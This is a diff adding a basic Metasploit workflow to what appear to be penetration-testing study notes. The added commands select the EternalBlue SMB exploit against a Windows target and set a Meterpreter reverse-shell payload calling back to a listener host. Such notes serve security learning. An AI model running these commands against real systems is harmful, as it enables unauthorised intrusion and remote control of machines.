@@ -13,3 +13,22 @@ Module Types:
 - Auxiliary    - scanning, fuzzing, and other supporting modules (not exploits themselves)
 - Post         - post-exploitation modules (privilege escalation, day 08, credential dumping, day 17)
 - Encoders     - obfuscate payloads to evade detection
+
+Basic workflow:
+```bash
+# launch msfconsole
+msfconsole
+
+# search for a relevant exploit
+search type:exploit platform:windows smb
+
+# select the exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# view required options
+show options
+
+# set target and payload
+set RHOSTS 192.168.1.10
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
